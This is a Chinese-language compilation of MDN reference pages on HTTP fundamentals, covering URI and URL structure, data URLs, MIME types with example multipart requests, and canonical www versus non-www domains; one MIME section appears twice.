# HTTP

**超文本传输协议（HTTP）**是一个用于传输超媒体文档（例如 HTML）的[应用层](https://en.wikipedia.org/wiki/Application_Layer)协议。它是为 Web 浏览器与 Web 服务器之间的通信而设计的，但也可以用于其他目的。HTTP 遵循经典的[客户端-服务端模型](https://en.wikipedia.org/wiki/Client–server_model)，客户端打开一个连接以发出请求，然后等待直到收到服务器端响应。HTTP 是[无状态协议](http://en.wikipedia.org/wiki/Stateless_protocol)，这意味着服务器不会在两个请求之间保留任何数据（状态）。尽管通常基于 TCP/IP 层，但它可以在任何可靠的[传输层](https://zh.wikipedia.org/wiki/传输层)上使用，也就是说，该协议不会像 UDP 那样静默的丢失消息。[RUDP](https://en.wikipedia.org/wiki/Reliable_User_Datagram_Protocol)——作为 UDP 的可靠化升级版本——是一种合适的替代选择。

# 标识互联网上的内容

HTTP 请求的内容通称为"资源"。”资源“这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 ([URI](https://developer.mozilla.org/zh-CN/docs/Glossary/URI)) 来进行标识。

一般情况下，资源的名称和位置由同一个 URL（统一资源定位符，它是 URI 的一种）来标识。也有某些特殊情况，资源的名称和位置由不同的 URI 进行标识：例如，待请求的资源希望客户端从另外一个位置访问它。我们可以使用一个特定的首部字段，[`Alt-Svc`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Alt-Svc)，来指示这种情况。

## [URLs 与 URNs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#urls_与_urns)

### [URLs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#urls)

URI 的最常见形式是统一资源定位符 ([URL](https://developer.mozilla.org/zh-CN/docs/Glossary/URL))，它也被称为 *Web 地址*。

```
https://developer.mozilla.org
https://developer.mozilla.org/en-US/docs/Learn/
https://developer.mozilla.org/en-US/search?q=URL
```

在浏览器的地址栏中输入上述任一地址，浏览器就会加载相应的网页（资源）。

URL 由多个必须或可选的组件构成。下面给出了一个复杂的 URL：

```
http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument
```

### [URNs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#urns)

URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。

```
urn:isbn:9780141036144
urn:ietf:rfc:7230
```

上面两个 URN 标识了下面的资源：

- 乔治·奥威尔所著的《1984》
- IETF规范7230，超文本传输协议 (HTTP/1.1)：Message Syntax and Routing.

## [统一资源标识符的语法 (URI)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#统一资源标识符的语法_(uri))

### [方案或协议](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#方案或协议)

```
http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument
```



| 方案        | 描述                                                         |
| :---------- | :----------------------------------------------------------- |
| data        | [Data URIs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URIs) |
| file        | 指定主机上文件的名称                                         |
| ftp         | [文件传输协议](https://developer.mozilla.org/en-US/docs/Glossary/FTP) |
| http/https  | [超文本传输协议／安全的超文本传输协议](https://developer.mozilla.org/en-US/docs/Glossary/HTTP) |
| mailto      | 电子邮件地址                                                 |
| ssh         | 安全 shell                                                   |
| tel         | 电话                                                         |
| urn         | 统一资源名称                                                 |
| view-source | 资源的源代码                                                 |
| ws/wss      | （加密的） [WebSocket (en-US)](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API) 连接 |

### [主机](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#主机)

`www.example.com` 既是一个域名，也代表管理该域名的机构。它指示了需要向网络上的哪一台主机发起请求。当然，也可以直接向主机的 [IP address](https://developer.mozilla.org/zh-CN/docs/Glossary/IP_Address) 地址发起请求。但直接使用 IP 地址的场景并不常见。

### [端口](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#端口)

`:80` 是端口。它表示用于访问 Web 服务器上资源的技术“门”。如果访问的该 Web 服务器使用HTTP协议的标准端口（HTTP为80，HTTPS为443）授予对其资源的访问权限，则通常省略此部分。否则端口就是 URI 必须的部分。

### [路径](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#路径)

`/path/to/myfile.html` 是 Web 服务器上资源的路径。在 Web 的早期，类似这样的路径表示 Web 服务器上的物理文件位置。现在，它主要是由没有任何物理实体的 Web 服务器抽象处理而成的。

### [查询](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#查询)

`?key1=value1&key2=value2` 是提供给 Web 服务器的额外参数。这些参数是用 & 符号分隔的键/值对列表。Web 服务器可以在将资源返回给用户之前使用这些参数来执行额外的操作。每个 Web 服务器都有自己的参数规则，想知道特定 Web 服务器如何处理参数的唯一可靠方法是询问该 Web 服务器所有者。

### [片段](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#片段)

`#SomewhereInTheDocument` 是资源本身的某一部分的一个锚点。锚点代表资源内的一种“书签”，它给予浏览器显示位于该“加书签”点的内容的指示。 例如，在HTML文档上，浏览器将滚动到定义锚点的那个点上；在视频或音频文档上，浏览器将转到锚点代表的那个时间。值得注意的是 **# 号后面的部分，也称为片段标识符，永远不会与请求一起发送到服务器。**

## [示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Identifying_resources_on_the_Web#示例)

```
https://developer.mozilla.org/en-US/docs/Learn
tel:+1-816-555-1212
git@github.com:mdn/browser-compat-data.git
ftp://example.org/resource.txt
urn:isbn:9780141036144
```

# Data URLs

**Data URLs**，即前缀为 `data:` 协议的URL，其允许内容创建者向文档中嵌入小文件。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URIs#syntax)

Data URLs 由四个部分组成：前缀(`data:`)、指示数据类型的MIME类型、如果非文本则为可选的`base64`标记、数据本身：

```
data:[<mediatype>][;base64],<data>
mediatype `是个 MIME 类型的字符串，例如 "`image/jpeg`" 表示 JPEG 图像文件。如果被省略，则默认值为 `text/plain;charset=US-ASCII
```

如果数据是文本类型，你可以直接将文本嵌入 (根据文档类型，使用合适的实体字符或转义字符)。如果是二进制数据，你可以将数据进行base64编码之后再进行嵌入。

下面是一些示例：

- `data:,Hello%2C%20World!`

  简单的 text/plain 类型数据

- `data:text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D`

  上一条示例的 base64 编码版本

- `data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E`

  一个HTML文档源代码 `<h1>Hello, World</h1>`

- `data:text/html,<script>alert('hi');</script>`

  一个会执行 JavaScript alert 的 HTML 文档。注意 script 标签必须封闭。

## [给数据作 base64 编码](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URIs#encoding_data_into_base64_format)

在Linux或者Mac OS系统上，你可以使用 `uuencode `命令行工具来简单实现编码：

```
uuencode -m infile remotename
```

`infile` 参数表示要作 base64编码的文件名称，`remotename` 参数表示输出的文件名称, 实际上并没有在 data 方案的URLs 中使用。

输出结果如下：

```
begin-base64 664 test
YSBzbGlnaHRseSBsb25nZXIgdGVzdCBmb3IgdGV2ZXIK
====
```

以上 Data URL 会使用位于首行之后的编码后的数据

### [在网页上使用 JavaScript](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URIs#在网页上使用_javascript)

Web APIs 已经有对 base64 进行编码解码的方法: [Base64 encoding and decoding](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Base64_encoding_and_decoding).

## [常见问题](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URIs#common_problems)

下文介绍一些在使用`data` URIs时遇到的常见问题:

### 语法

`data` URLs 的格式很简单，但很容易会忘记把逗号加在 "data" 协议名后面，在对数据进行 base64 编码时也很容易发生错误。

### HTML代码格式化

一个 `data` URL 是一个文件中的文件，相对于文档来说这个文件可能就非常的长。因为 data URL 也是 URL，所以 data 会用空白符(换行符, 制表符, 空格)来对它进行格式化。但如果数据是经过 base64 编码的，就可能会[遇到一些问题](https://bugzilla.mozilla.org/show_bug.cgi?id=73026#c12)。

### 长度限制

虽然 Firefox 支持无限长度的 `data` URLs，但是标准中并没有规定浏览器必须支持任意长度的 `data` URIs。比如，Opera 11浏览器限制 URLs 最长为 65535 个字符，这意味着 data URLs 最长为 65529 个字符（如果你使用纯文本 data:, 而不是指定一个 MIME 类型的话，那么 65529 字符长度是编码后的长度，而不是源文件）。

### 缺乏错误处理

MIME类型错误或者base64编码错误,都会造成`data` URIs无法被正常解析, 但不会有任何相关错误提示.

### 不支持查询字符串

一个data URI的数据字段是没有结束标记的,所以尝试在一个data URI后面添加查询字符串会导致,查询字符串也一并被当作数据字段.例如:

```
data:text/html,lots of text...<p><a name%3D"bottom">bottom</a>?arg=val
```

这个 data URL 代表的 HTML 源文件内容为:

```
lots of text...<p><a name="bottom">bottom</a>?arg=val
```

# MIME 类型

**媒体类型**（通常称为 **Multipurpose Internet Mail Extensions** 或 **MIME** 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。它在[IETF RFC 6838](https://tools.ietf.org/html/rfc6838)中进行了定义和标准化。

互联网号码分配机构（[IANA](https://www.iana.org/)）是负责跟踪所有官方MIME类型的官方机构，您可以在[媒体类型](https://www.iana.org/assignments/media-types/media-types.xhtml)页面中找到最新的完整列表。

**重要：**浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#语法)

### [通用结构](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#通用结构)

```
type/subtype
```

MIME的组成结构非常简单；由类型与子类型两个字符串中间用`'/'`分隔而组成。**不允许空格存在**。*type* 表示可以被分多个子类的独立类别。*subtype 表示细分后的每个类型。*

MIME类型对大小写不敏感，但是**传统写法都是小写**。


IN THIS ARTICLE[语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#语法)[重要的MIME类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#重要的mime类型)[设置正确的MIME类型的重要性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#设置正确的mime类型的重要性)[MIME 嗅探](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#mime_嗅探)[其他传送文件类型的方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#其他传送文件类型的方法)[其他](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#其他)

# MIME 类型

**媒体类型**（通常称为 **Multipurpose Internet Mail Extensions** 或 **MIME** 类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。它在[IETF RFC 6838](https://tools.ietf.org/html/rfc6838)中进行了定义和标准化。

互联网号码分配机构（[IANA](https://www.iana.org/)）是负责跟踪所有官方MIME类型的官方机构，您可以在[媒体类型](https://www.iana.org/assignments/media-types/media-types.xhtml)页面中找到最新的完整列表。

**重要：**浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#语法)

### [通用结构](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#通用结构)

```
type/subtype
```

MIME的组成结构非常简单；由类型与子类型两个字符串中间用`'/'`分隔而组成。不允许空格存在。*type* 表示可以被分多个子类的独立类别。*subtype 表示细分后的每个类型。*

MIME类型对大小写不敏感，但是传统写法都是小写。

### [独立类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#独立类型)

```
text/plain
text/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
application/*
application/json
application/javascript
application/ecmascript
application/octet-stream
…
```

*独立*类型表明了对文件的分类，可以是如下之一：

| 类型          | 描述                                                         | 典型示例                                                     |
| :------------ | :----------------------------------------------------------- | :----------------------------------------------------------- |
| `text`        | 表明文件是普通文本，理论上是人类可读                         | `text/plain`, `text/html`, `text/css, text/javascript`       |
| `image`       | 表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型 | `image/gif`, `image/png`, `image/jpeg`, `image/bmp`, `image/webp`, `image/x-icon`, `image/vnd.microsoft.icon` |
| `audio`       | 表明是某种音频文件                                           | `audio/midi`, `audio/mpeg, audio/webm, audio/ogg, audio/wav` |
| `video`       | 表明是某种视频文件                                           | `video/webm`, `video/ogg`                                    |
| `application` | 表明是某种二进制数据                                         | `application/octet-stream`, `application/pkcs12`, `application/vnd.mspowerpoint`, `application/xhtml+xml`, `application/xml`, `application/pdf` |

对于text文件类型若没有特定的subtype，就使用 `text/plain`。类似的，二进制文件没有特定或已知的 subtype，即使用 `application/octet-stream`。

### [Multipart 类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#multipart_类型)

```
multipart/form-data
multipart/byteranges
```

*Multipart* 类型表示细分领域的文件类型的种类，经常对应不同的 MIME 类型。这是*复合*文件的一种表现方式。`multipart/form-data` 可用于联系 [HTML Forms](https://developer.mozilla.org/en-US/docs/Learn/Forms) 和 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 方法，此外 `multipart/byteranges`使用状态码[`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206) `Partial Content`来发送整个文件的子集，**而HTTP对不能处理的复合文件使用特殊的方式：将信息直接传送给浏览器**（这时可能会建立一个“另存为”窗口，但是却不知道如何去显示内联文件。）

## [重要的MIME类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#重要的mime类型)

### [application/octet-stream](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#applicationoctet-stream)

这是应用程序文件的默认值。意思是 *未知的应用程序文件 ，*浏览器一般不会自动执行或询问执行。浏览器会像对待 设置了HTTP头[`Content-Disposition`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition) 值为 `attachment` 的文件一样来对待这类文件。

### [text/plain](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#textplain)

**文本文件默认值。**即使它*意味着未知的文本文件*，但浏览器认为是可以直接展示的。

`text/plain`并不是意味着某种文本数据。如果浏览器想要一个文本文件的明确类型，浏览器并不会考虑他们是否匹配。比如说，如果通过一个表明是下载CSS文件的[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link)链接下载了一个 `text/plain` 文件。如果提供的信息是text/plain，浏览器并不会认出这是有效的CSS文件。CSS类型需要使用text/css。

### [text/css](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#textcss)

在网页中要被解析为CSS的任何CSS文件必须指定MIME为`text/css`。通常，服务器不识别以.css为后缀的文件的MIME类型，而是将其以MIME为`text/plain` 或 `application/octet-stream` 来发送给浏览器：在这种情况下，大多数浏览器不识别其为CSS文件，直接忽略掉。特别要注意为CSS文件提供正确的MIME类型。

### [text/html](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#texthtml)

所有的HTML内容都应该使用这种类型。XHTML的其他MIME类型（如`application/xml+html`）现在基本不再使用（HTML5统一了这些格式）。

注意：如果您打算使用 XML 的严格解析规则，您仍然需要使用 application/xml 或 application/xhtml+xml，使用 <![CDATA[…]]> 或来自非 HTML、非 SVG 或非 ‑MathML XML 命名空间，因为 text/html 的解析语义与 application/xml 的解析语义略有不同。

### [text/javascript](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#textjavascript)

据 HTML 标准，应该总是使用 MIME 类型 `text/javascript` 服务 JavaScript 文件。其他值不被认为有效，使用那些值可能会导致脚本不被载入或运行。

历史原因，[MIME 嗅探标准](https://mimesniff.spec.whatwg.org/)（定义浏览器应该如何解释媒体类型和如何处理无有效媒体类型的内容）允许使用匹配以下任意的 MIME 类型服务 JavaScript：

- `application/javascript`
- `application/ecmascript`
- `application/x-ecmascript` 
- `application/x-javascript` 
- `text/javascript`
- `text/ecmascript`
- `text/javascript1.0` 
- `text/javascript1.1` 
- `text/javascript1.2` 
- `text/javascript1.3` 
- `text/javascript1.4` 
- `text/javascript1.5` 
- `text/jscript` 
- `text/livescript` 
- `text/x-ecmascript` 
- `text/x-javascript` 

**注意：**即便任何给定的 [user agent](https://developer.mozilla.org/zh-CN/docs/Glossary/User_agent) 可能支持这些中的任意或所有，你只应该使用 `text/javascript`。它是唯一确保能在目前和以后正常工作的 MIME 类型。

你可能发现某些内容在 `text/javascript` 媒体类型末尾有一个 `charset` 参数，指定用于表示代码内容的字符集。这不是合法的，而且在大多数场景下会导致脚本不被载入。

### [图片类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#图片类型)

只有一小部分图片类型是被广泛支持的，Web安全的，可随时在Web页面中使用的：

| MIME 类型       | 图片类型                             |
| :-------------- | :----------------------------------- |
| `image/gif`     | GIF 图片 (无损耗压缩方面被PNG所替代) |
| `image/jpeg`    | JPEG 图片                            |
| `image/png`     | PNG 图片                             |
| `image/svg+xml` | SVG图片 (矢量图)                     |

此处的类型划分有一定的争议，有人认为此处应该增加 WebP（`image/webp`），但是每个新增的图片类型都会增加代码的数量，这会带来一些新的安全问题，所以浏览器供应商对于添加类型非常小心。

另外的一些图片种类可以在Web文档中找到。比如很多浏览器支持 *icon 类型的图标作为* favicons或者类似的图标，并且浏览器在MIME类型中的 `image/x-icon` 支持ICO图像。

Footnote 1

尽管 `image/vnd.microsoft.icon` [在ANA注册](https://www.iana.org/assignments/media-types/image/vnd.microsoft.icon), 它仍然不被广泛支持，`image/x-icon` 被作为替代品使用。

### [音频与视频类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#音频与视频类型)

HTML并没有明确定义被用于[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio)和[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video)元素所支持的文件类型，所以在web上使用的只有相对较小的一组类型。[ ](https://developer.mozilla.org/en-US/docs/Web/Media/Formats)文章 [Media formats supported by the HTML audio and video elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Supported_media_formats) 解释了可以被使用的解码器或视频文件格式。

在web环境最常用的视频文件的格式，是以下这些这些文件类型：

| MIME 类型                                               | 音频或视频类型                                               |
| :------------------------------------------------------ | :----------------------------------------------------------- |
| `audio/wave` `audio/wav` `audio/x-wav` `audio/x-pn-wav` | 音频流媒体文件。一般支持PCM音频编码 (WAVE codec "1") ，其他解码器有限支持（如果有的话）。 |
| `audio/webm`                                            | WebM 音频文件格式。Vorbis 和 Opus 是其最常用的解码器。       |
| `video/webm`                                            | 采用WebM视频文件格式的音视频文件。VP8 和 VP9是其最常用的视频解码器。Vorbis 和 Opus 是其最常用的音频解码器。 |
| `audio/ogg`                                             | 采用OGG多媒体文件格式的音频文件。 Vorbis 是这个多媒体文件格式最常用的音频解码器。 |
| `video/ogg`                                             | 采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。 |
| `application/ogg`                                       | 采用OGG多媒体文件格式的音视频文件。常用的视频解码器是 Theora；音频解码器为Vorbis 。 |
| `application/json`                                      | application/json (MIME_type)                                 |

### [multipart/form-data](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#multipartform-data)

`multipart/form-data` 可用于[HTML表单](https://developer.mozilla.org/en-US/docs/Learn/Forms)从浏览器发送信息给服务器。作为多部分文档格式，它由边界线（一个由`'--'`开始的字符串）划分出的不同部分组成。每一部分有自己的实体，以及自己的 HTTP 请求头，[`Content-Disposition`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition)和 [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 用于文件上传领域，最常用的 ([`Content-Length`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Length) 因为边界线作为分隔符而被忽略）。

```http
Content-Type: multipart/form-data; boundary=aBoundaryString
(other headers associated with the multipart document as a whole)

--aBoundaryString
Content-Disposition: form-data; name="myFile"; filename="img.jpg"
Content-Type: image/jpeg

(data)
--aBoundaryString
Content-Disposition: form-data; name="myField"

(data)
--aBoundaryString
(more subparts)
--aBoundaryString--
```

如下所示的表单:

```html
<form action="http://localhost:8000/" method="post" enctype="multipart/form-data">
  <input type="text" name="myTextField">
  <input type="checkbox" name="myCheckBox">Check</input>
  <input type="file" name="myFile">
  <button>Send the file</button>
</form>
```

Copy to Clipboard

会发送这样的请求:

```http
POST / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------8721656041911415653955004498
Content-Length: 465

-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myTextField"

Test
-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myCheckBox"

on
-----------------------------8721656041911415653955004498
Content-Disposition: form-data; name="myFile"; filename="test.txt"
Content-Type: text/plain

Simple file.
-----------------------------8721656041911415653955004498--
```

### [multipart/byteranges](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#multipartbyteranges)

`multipart/byteranges` 用于把部分的响应报文发送回浏览器。当发送状态码[`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206)`Partial Content` 时，这个MIME类型用于指出这个文件由若干部分组成，每一个都有其请求范围。就像其他很多类型[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)使用分隔符来制定分界线。每一个不同的部分都有[`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type)这样的HTTP头来说明文件的实际类型，以及 [`Content-Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Range)来说明其范围。

```http
HTTP/1.1 206 Partial Content
Accept-Ranges: bytes
Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
Content-Length: 385

--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 100-200/1270

eta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="vieport" content
--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 300-400/1270

-color: #f0f0f2;
        margin: 0;
        padding: 0;
        font-family: "Open Sans", "Helvetica
--3d6b6a416f9b5--
```

## [设置正确的MIME类型的重要性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#设置正确的mime类型的重要性)

很多web服务器使用默认的 `application/octet-stream` 来发送未知类型。出于一些安全原因，对于这些资源浏览器不允许设置一些自定义默认操作，导致用户必须存储到本地以使用。常见的导致服务器配置错误的文件类型如下所示：

- RAR编码文件。在这种情况，理想状态是，设置真实的编码文件类型；但这通常不可能（可能是服务器所未知的类型或者这个文件包含许多其他的不同的文件类型）。这这种情况服务器将发送 `application/x-rar-compressed` 作为MIME类型，用户不会将其定义为有用的默认操作。
- 音频或视频文件。只有正确设置了MIME类型的文件才能被 <vedio>或<audio>别和播放。 可参照  [use the correct type for audio and video](https://developer.mozilla.org/En/Media_formats_supported_by_the_audio_and_video_elements)。
- 专有文件类型。是专有文件时需要特别注意。使用 `application/octet-stream` 作为特殊处理是不被允许的：对于一般的MIME类型浏览器不允许定义默认行为（比如“在Word中打开”）

## [MIME 嗅探](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#mime_嗅探)

在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行MIME嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 MIME 类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 来设置 [`X-Content-Type-Options`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options) 以阻止MIME嗅探。

## [其他传送文件类型的方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#其他传送文件类型的方法)

MIME类型不是传达文档类型信息的唯一方式：

- 有时会使用名称后缀，特别是在Microsoft Windows系统上。并非所有的操作系统都认为这些后缀是有意义的（特别是Linux和Mac OS），并且像外部MIME类型一样，不能保证它们是正确的。
- 魔术数字。不同类型的文件的语法通过查看结构来允许文件类型推断。例如，每个GIF文件以47 49 46 38十六进制值[GIF89]或89 50 4E 47 [.PNG]的PNG文件开头。 并非所有类型的文件都有幻数，所以这也不是100％可靠的方式。

# 常见 MIME 类型列表

这是一份 MIME 类型列表，以及各个类型的文档类别，按照它们的常见扩展名排序。

两种主要的 MIME 类型在默认类型中扮演了重要的角色：

- `text/plain` 表示文本文件的默认值。一个文本文件应当是人类可读的，并且不包含二进制数据。
- `application/octet-stream` 表示所有其他情况的默认值。一种未知的文件类型应当使用此类型。浏览器在处理这些文件时会特别小心, 试图防止、避免用户的危险行为.

# 选择 www 或非 www URL 作为域名

网站所有者经常会问的一个问题是选择非 www 的还是 www 的网址。本文提供了选择建议。

## [什么是域名？](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Choosing_between_www_and_non-www_URLs#什么是域名？)

在一个 HTTP 网址中，在初始 `http://` 或 `https://` 后的第一个子字符串称为域。它是文档所在的服务器的名称。

一个服务器不一定是一个独立的物理机：几台服务器可以驻留在同一台物理机器上，或者一台服务器可以通过几台机器进行处理，协作处理并响应或负载均衡它们之间的请求。关键点在于语义上**一个域名代表一个单独的服务器**。

## [所以，我只能选择其中一个做为我的网站的网址？](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Choosing_between_www_and_non-www_URLs#所以，我只能选择其中一个做为我的网站的网址？)

- 是的，你必须选择其中之一，且一直使用。选择使用其中哪一个取决于你，当你选择完之后，就要保持下去。这样，无论是对用户，还是对搜索引擎，你的网站能保持更好的一致性。这包括始终链接到所选域名（如果你在网站中使用相对网址，则不应该很难），也可以始终将链接（通过电子邮件/社交网络等）共享使用同一个域名。
- 不，你可以有两个。重要的是，你需是保持的那一个官方的域名，**这个官方域名被称为\*规范\*名称**。你所有的绝对链接应该使用它。但即便如此，你仍然可以有其他域名使用：HTTP允许使用两种技术，以便它在使用规范域名的同时还允许非规范域名使用，使使用者或搜索引擎可以准确的访问到所预期的页面。

所以，选择其中一个作为你的域名的规范地址！下面有两种技术允许不规范的域名仍然起作用。

## [规范网址方式](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Choosing_between_www_and_non-www_URLs#规范网址方式)

选择下面有两种不同的方式使网站*规范*。

### [使用 HTTP 301 重定向](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Choosing_between_www_and_non-www_URLs#使用_http_301_重定向)

在这种情况下，你需要配置服务器接收的HTTP请求（ 常见为 www 和非 www 网址相同）以及适当的HTTP响应 [`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301) 去响应所有非规范的域名请求。这会将尝试使访问非规范网址的浏览器重定向到其规范的等效网址。举例来说，如果您选择使用非 www 网址为规范类型，你的所有 www 网址都应该被重定向到对应的非 www 网址上。

例如：

1. 服务器收到 http://www.example.org/whaddup 请求（当规范域名是 example.org 时）
2. 服务器则以代码 [`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301) 与头 [`Location`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Location) ：`http://example.org/whaddup`
3. 该客户端发出的规范的域名请求：http://example.org/whaddup

它可以将一个特殊的 HTML [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link) 元素添加到网页指示什么网页的标准地址，这对页面的访问者没有影响，但在搜索引擎检索时会告诉搜索引擎当页面实际的地址。通过这种方式，搜索引擎不需要索引同一页面多次，那样可能导致它被视为重复的内容或垃圾邮件，甚至从搜索引擎结果中删除或者降低你的页面显示排名。

当加入这样一个标签，会告诉搜索引擎，你提供相同内容的两个域名那一个是规范的。以前面的例子为例，http://www.example.org/whaddup 将提供与 http://example.org/whaddup 相同的内容，但有一个附加的 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link) 头部元素：

```
<link href="http://example.org/whaddup" rel="canonical">
```

